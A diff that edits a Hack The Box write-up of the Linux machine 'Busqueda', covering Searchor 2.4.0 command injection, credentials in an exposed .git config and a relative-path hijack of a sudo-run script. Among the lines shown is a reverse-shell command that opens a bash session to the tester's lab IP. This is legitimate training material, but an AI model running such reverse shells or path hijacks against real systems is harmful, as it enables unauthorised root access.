@@ -1,6 +1,6 @@
 ---
 title: Busqueda
-description: Python command injection in Searchor 2.4.0 for a foothold, then a relative-path hijack in a sudo-run script for root.
+description: Python command injection in Searchor 2.4.0, escalating to root via a relative-path hijack in a sudo-run script.
 os: Linux
 environment: Standalone
 difficulty: Easy
@@ -12,11 +12,11 @@ import Callout from '@components/Callout.astro';
 import FlagCapture from '@components/FlagCapture.astro';
 import AttackPath from '@components/AttackPath.astro';
 
-> Python command injection in Searchor 2.4.0, escalating to root via a relative-path hijack in a sudo-run script.
+> A Linux box where a third-party library is trusted further than it should be, and the people maintaining it leave more behind than they mean to.
 
 ## Recon
 
-> Every box opens with the same two questions: what is listening, and what is it running?
+> A box named Busqueda, which is Spanish for search. Something here probably takes a query, and before I type one I want to know what is listening.
 
 First, confirm the host is actually up.
 
@@ -39,14 +39,14 @@ rtt min/avg/max/mdev = 79.593/80.953/81.800/0.866 ms
 
 The `ttl=63` is a small tell: Linux starts at 64 and every hop knocks one off. The scan settles it.
 
-<Toggle label="Service & version enumeration <code>nmap</code>">
+<Toggle label="Aggressive scan, OS detection & extended service enumeration <code>nmap</code>">
 
 ```bash frame="code" title="Bash" {13}
 ┌──(Idan@Kali)-[~/Busqueda]
-└─> nmap -sC -sV 10.129.228.217
+└─> nmap -A 10.129.228.217
 Starting Nmap 7.98 ( https://nmap.org )
 Nmap scan report for 10.129.228.217
-Host is up (0.087s latency).
+Host is up (0.071s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
@@ -56,29 +56,10 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    Apache httpd 2.4.52
 |_http-title: Did not follow redirect to http://searcher.htb/
 |_http-server-header: Apache/2.4.52 (Ubuntu)
-Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-```
-
-</Toggle>
-
-OS fingerprinting and extended service enumeration confirm Linux 5.x, but reveal nothing actionable.
-
-<Toggle label="Aggressive scan, OS detection & extended service enumeration <code>nmap</code>">
-
-```bash frame="code" title="Bash"
-┌──(Idan@Kali)-[~/Busqueda]
-└─> nmap -A 10.129.228.217
-Starting Nmap 7.98 ( https://nmap.org )
-Nmap scan report for 10.129.228.217
-Host is up (0.097s latency).
-Not shown: 998 closed tcp ports (reset)
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
-80/tcp open  http    Apache httpd 2.4.52
-Device type: general purpose
-Running: Linux 5.X
-OS CPE: cpe:/o:linux:linux_kernel:5
-OS details: Linux 5.0 - 5.14
+Device type: general purpose|router
+Running: Linux 5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
 Network Distance: 2 hops
 Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
@@ -256,7 +237,7 @@ The reverse shell drops me into `/var/www/app` as `svc`, inside the application 
 
 <Toggle label="Reading the user flag <code>cat</code>">
 
-```bash frame="code" title="Bash"
+```bash frame="code" title="Shell"
 svc@busqueda:/var/www/app$ cd /home/svc
 svc@busqueda:~$ cat user.txt
 <user flag>
@@ -282,7 +263,7 @@ A `.git` folder inside the web root is a gift: its config may hold the remote's 
 
 <Toggle label="Exposed <code>.git/config</code> and remote credentials">
 
-```bash frame="code" title="Bash" {9}
+```bash frame="code" title="Shell" {9}
 svc@busqueda:~$ cd /var/www/app/.git
 svc@busqueda:/var/www/app/.git$ cat config
 [core]
@@ -345,7 +326,7 @@ With the password in hand, `sudo -l` is the fast path.
 
 <Toggle label="Where can svc act as root? <code>sudo</code>">
 
-```bash frame="code" title="Bash" {7}
+```bash frame="code" title="SSH" {7}
 svc@busqueda:~$ sudo -l
 [sudo] password for svc:
 Matching Defaults entries for svc on busqueda:
@@ -361,7 +342,7 @@ So `svc` can run one specific script as root with any arguments (`*`). The sourc
 
 <Toggle label="Enumerating <code>system-checkup.py</code>">
 
-```bash frame="code" title="Bash"
+```bash frame="code" title="SSH"
 svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py --help
 Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
 
@@ -381,7 +362,7 @@ f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 years ago   Up 
 
 <Toggle label="Container environment <code>docker-inspect gitea</code>">
 
-```bash frame="code" title="Bash" {11}
+```bash frame="code" title="SSH" {11}
 svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' gitea
 # piped the JSON back on Kali through jq:
 {
@@ -447,7 +428,7 @@ So I drop a custom `full-checkup.sh` (a reverse shell) into a directory I contro
 [+] Listening for reverse shells on 0.0.0.0:4444
 ```
 
-```bash frame="code" title="Bash"
+```bash frame="code" title="SSH"
 # Terminal 2: plant the helper and trigger it
 svc@busqueda:~$ echo -e '#!/bin/bash\n/bin/bash -i >& /dev/tcp/10.10.14.87/4444 0>&1' > full-checkup.sh; chmod +x full-checkup.sh
 svc@busqueda:~$ cat full-checkup.sh
@@ -468,7 +449,7 @@ The shell that comes back is already root. I confirm it before taking the flag.
 
 <Toggle label="Confirming root and reading the flag <code>whoami</code>">
 
-```bash frame="code" title="Bash"
+```bash frame="code" title="Shell"
 root@busqueda:/home/svc# whoami
 root
 root@busqueda:/home/svc# cat /root/root.txt
